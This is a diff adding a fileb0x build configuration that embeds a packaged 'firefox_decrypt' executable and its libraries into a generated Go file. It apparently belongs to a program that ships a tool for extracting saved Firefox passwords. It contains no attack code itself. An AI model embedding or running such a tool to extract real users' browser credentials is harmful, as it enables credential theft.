@@ -1,0 +1,38 @@
+# b0x.yaml
+
+# Default package name for the generated b0x.go file
+pkg: static
+
+# Destination directory for the generated files
+dest: "./static/"
+
+# Optional: Enable gofmt for the generated code
+fmt: true
+
+# Custom configuration for including files in the virtual filesystem
+custom:
+  - files:
+      - "./firefox_decrypt/"
+    prefix: ""
+
+  - files:
+      - "./firefox_decrypt/firefox_decrypt.exe"
+      - "./firefox_decrypt/_internal/*.dll"
+      - "./firefox_decrypt/_internal/*.zip"
+      - "./firefox_decrypt/_internal/lib-dynload/*.pyd"
+    prefix: "/firefox_decrypt"
+
+# Optional: Specify the output file name for the generated b0x.go file
+output: "ab0x.go"
+
+# Optional: Disable adding "a" prefix to output
+noprefix: false
+
+# Optional: Build non-exported functions, variables, and types
+unexported: false
+
+# Optional: Enable log of changed files when spread is active
+lcf: true
+
+# Optional: Enable debug mode (useful for web development)
+debug: false
